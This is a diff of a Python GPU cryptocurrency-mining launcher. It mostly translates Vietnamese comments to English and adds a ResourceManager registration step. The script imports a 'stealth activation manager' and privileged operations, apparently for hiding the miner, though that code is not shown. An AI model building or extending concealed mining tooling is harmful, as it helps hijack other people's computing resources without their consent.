@@ -23,7 +23,7 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import psutil
 # **GPU-Only Mode**: All CPU mining functionality has been permanently removed
 
-# **Import** (nhập khẩu) các **module** (mô-đun – thành phần chức năng) từ **library** (thư viện) mining_environment
+# Import core mining environment modules
 from mining_environment.scripts.logging_config import setup_logging
 from mining_environment.scripts.module_loggers import (
     get_gpu_plugin_logger,
@@ -34,20 +34,20 @@ from mining_environment.scripts.resource_manager import ResourceManager
 from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 
-# **Import** (nhập khẩu) **Stealth Activation Manager** (trình quản lý kích hoạt ẩn danh – centralized stealth system)
+# Import stealth activation manager
 from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
-# Enhanced PID Logger với Real Process Output Monitor
+# Enhanced PID Logger with real process output monitoring
 from pid_logger import start_worker, log_pid, register_process
 
 
 
 
 
-# Thiết lập **log directory path** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
+# Setup log directory path
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 
-# **Main application logger** (logger ứng dụng chính)
+# Main application logger
 logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')
 
 # ---------- DEBUG GPU-ONLY LOGGING BOOSTER ----------
@@ -69,22 +69,17 @@ except Exception as _dbg_err:
     logger.warning(f'GPU debug booster init failed: {_dbg_err}')
 # ---------- END GPU BOOSTER ----------
 
-# **GPU-Only Loggers** (Logger GPU chuyên dụng)
+# GPU-specific loggers
 gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
 gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')
 
 stop_event = threading.Event()
 
-# **Lock-Free Process Manager** (Trình quản lý tiến trình không khóa)
+# Enhanced lock-free process manager
 import weakref
 
 class LockFreeProcessManager:
-    """
-    **Enhanced Lock-Free Process Manager** (Trình quản lý tiến trình không khóa nâng cao)
-    - Dual PID tracking: wrapper và real mining process
-    - Process group management cho proper cleanup
-    - Signal coordination để graceful shutdown
-    """
+    """Enhanced process manager with dual PID tracking and graceful shutdown"""
     def __init__(self):
         self._gpu_process_ref = None
         self._real_mining_pid = None
@@ -93,7 +88,7 @@ class LockFreeProcessManager:
         self._cleanup_callbacks = []
         
     def set_gpu_process(self, process, real_mining_pid=None, process_group_id=None):
-        """Enhanced process registration với dual PID tracking"""
+        """Register process with dual PID tracking"""
         if process:
             self._gpu_process_ref = weakref.ref(process)
             self._real_mining_pid = real_mining_pid
@@ -107,7 +102,7 @@ class LockFreeProcessManager:
             self._health_event.clear()
     
     def get_gpu_process_status(self):
-        """Enhanced status check cho both wrapper và real process"""
+        """Check status of both wrapper and real mining processes"""
         if not self._health_event.is_set():
             return False, None, None
             
@@ -137,14 +132,14 @@ class LockFreeProcessManager:
         return is_alive, self._gpu_process_ref() if self._gpu_process_ref else None, self._real_mining_pid
     
     def register_cleanup_callback(self, callback):
-        """Thread-safe cleanup callback registration cho graceful shutdown"""
+        """Register thread-safe cleanup callback for graceful shutdown"""
         import threading
         with threading.RLock():
             self._cleanup_callbacks.append(callback)
             logger.debug(f"🔧 [ENHANCED] Cleanup callback registered: {callback.__name__ if hasattr(callback, '__name__') else 'anonymous'}")
     
     def graceful_shutdown(self):
-        """Enhanced graceful shutdown với process group cleanup"""
+        """Enhanced graceful shutdown with process group cleanup"""
         logger.info("🔄 [ENHANCED] Starting graceful shutdown...")
         
         # Execute cleanup callbacks
@@ -179,7 +174,7 @@ class LockFreeProcessManager:
         self._process_group_id = None
         self._health_event.clear()
 
-# **Global Lock-Free Manager** (Trình quản lý toàn cục không khóa)
+# Global lock-free manager instance
 process_manager = LockFreeProcessManager()
 gpu_process = None  # Compatibility
 
@@ -317,38 +312,24 @@ def monitor_process_output(process, process_name, log_file, thread_logger):
         thread_logger.info(f"🔚 Stopped monitoring output for {process_name}")
 
 def dual_logger_thread(process, log_file, process_name, log_lock):
-    """
-    Ghi nhật ký kép an toàn luồng nâng cao - truyền dữ liệu thời gian thực với phát hiện tốc độ băm và theo dõi các chỉ số hiệu suất.
-
-    
-    Args:
-        process: Tiến trình cần theo dõi và ghi log
-        log_file: Tệp log để ghi dữ liệu
-        process_name (str): Tên tiến trình để hiển thị
-        log_lock: Khóa luồng để đảm bảo thread-safe
-    """
-    # **GPU-Only Logger Assignment** (Gán logger cho GPU duy nhất)
-    if 'gpu' in process_name.lower():
-        thread_logger = gpu_miner_logger
-    else:
-        thread_logger = logger  # fallback to main logger
-    hash_rates = []  # **Hash rate tracking** (theo dõi tốc độ băm – ghi lại các giá trị tốc độ tính toán)
+    """Enhanced dual logging thread for real-time data streaming with hash rate detection"""
+    # Select appropriate logger based on process type
+    thread_logger = gpu_miner_logger if 'gpu' in process_name.lower() else logger
+    hash_rates = []  # Track hash rates for performance metrics
     start_time = time.time()
     line_count = 0
     
     try:
         while True:
-            # **Non-blocking I/O** (nhập/xuất không chặn) với **select** (chọn lọc dữ liệu)
+            # Non-blocking I/O with select for data processing
             ready, _, _ = select.select([process.stdout], [], [], 1.0)
             if not ready:
-                # **Process termination check** (kiểm tra trạng thái kết thúc tiến trình)
-                if process.poll() is not None:
+                if process.poll() is not None:  # Process terminated
                     break
                 continue
 
             line = process.stdout.readline()
-            # **EOF detection** (phát hiện kết thúc tệp dữ liệu)
-            if line == '' and process.poll() is not None:
+            if line == '' and process.poll() is not None:  # EOF detection
                 break
                 
             if line:
@@ -1104,10 +1085,43 @@ def main():
             resource_manager_ready = True
             
             # ------------------------------------------------------------------
+            # 🥇 **SOLUTION 3: EXPLICIT REGISTRATION PATTERN** (đăng ký rõ ràng)
+            # ------------------------------------------------------------------
+            logger.info("🔧 [SOLUTION-3] Implementing Explicit ResourceManager Registration...")
+            
+            try:
+                # **Step 1: Get ResourceManager instance** (lấy instance ResourceManager)
+                rm_instance = ResourceManager._instance
+                if rm_instance:
+                    logger.info("✅ [SOLUTION-3] ResourceManager instance found for registration")
+                    
+                    # **Step 2: Get DirectPIDRegistry** (lấy DirectPIDRegistry)
+                    from pid_logger.direct_registry import get_direct_registry
+                    registry = get_direct_registry()
+                    
+                    # **Step 3: Register ResourceManager with DirectPIDRegistry** (đăng ký ResourceManager với DirectPIDRegistry)
+                    if hasattr(registry, 'register_resource_manager'):
+                        registration_success = registry.register_resource_manager(rm_instance)
+                        if registration_success:
+                            logger.info("🎯 [SOLUTION-3] ResourceManager SUCCESSFULLY REGISTERED with DirectPIDRegistry")
+                            logger.info("✅ [SOLUTION-3] Cross-process PID handoff mechanism activated")
+                            logger.info("🔗 [SOLUTION-3] DirectPIDRegistry → ResourceManager flow configured")
+                        else:
+                            logger.warning("⚠️ [SOLUTION-3] ResourceManager registration failed but continuing")
+                    else:
+                        logger.warning("⚠️ [SOLUTION-3] DirectPIDRegistry missing register_resource_manager method")
+                else:
+                    logger.error("❌ [SOLUTION-3] No ResourceManager instance available for registration")
+                    
+            except Exception as reg_error:
+                logger.error(f"❌ [SOLUTION-3] ResourceManager registration error: {reg_error}")
+                logger.warning("🔄 [SOLUTION-3] Continuing without registration - fallback mechanisms active")
+            
+            # ------------------------------------------------------------------
             # 4️⃣ **RACE CONDITION FIX**: Chỉ khởi động GPU process SAU KHI ResourceManager sẵn sàng
             # ------------------------------------------------------------------
             global gpu_process
-            logger.info("🎮 [RACE-FIX] Starting GPU Mining process AFTER ResourceManager ready...")
+            logger.info("🎮 [RACE-FIX] Starting GPU Mining process AFTER ResourceManager ready AND registered...")
             gpu_process = start_gpu_mining_process(privileged_manager=privileged_manager_global)
         else:
             logger.error("❌ [PHASE 3] ResourceManager NOT READY - CANNOT start GPU process")
